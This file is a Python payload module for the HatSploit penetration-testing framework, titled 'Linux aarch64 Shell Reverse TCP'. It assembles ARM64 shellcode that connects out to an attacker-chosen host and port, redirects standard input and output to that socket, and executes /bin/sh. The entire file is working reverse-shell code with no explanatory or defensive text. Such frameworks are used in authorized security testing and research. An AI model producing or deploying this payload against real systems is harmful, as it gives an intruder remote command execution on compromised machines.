"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Assembler, Socket):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux aarch64 Shell Reverse TCP",
            'Payload': "linux/aarch64/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for Linux aarch64.",
            'Architecture': "aarch64",
            'Platform': "linux",
            'Rank': "high",
            'Type': "reverse_tcp",
        }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                mov x8, 0xc6
                lsr x1, x8, 0x7
                lsl x0, x1, 0x1
                mov x2, xzr
                svc 0x1337

                mvn x4, x0
                lsl x1, x1, 0x1
                movk x1, 0x{self.rport.little.hex()}, lsl 0x10
                movk x1, 0x{self.rhost.little[2:].hex()}, lsl 0x20
                movk x1, 0x{self.rhost.little[:2].hex()}, lsl 0x30
                str x1, [sp, -8]!
                add x1, sp, x2
                mov x2, 0x10
                mov x8, 0xcb
                svc 0x1337

                lsr x1, x2, 0x2

            dup:
                mvn x0, x4
                lsr x1, x1, 0x1
                mov x2, xzr
                mov x8, 0x18
                svc 0x1337

                cmp x1, xzr
                bne dup

                mov x1, 0x622f
                movk x1, 0x6e69, lsl 0x10
                movk x1, 0x732f, lsl 0x20
                movk x1, 0x68, lsl 0x30
                str x1, [sp, -8]!
                mov x1, xzr
                mov x2, xzr
                add x0, sp, x1
                mov x8, 0xdd
                svc 0x1337
            """
        )
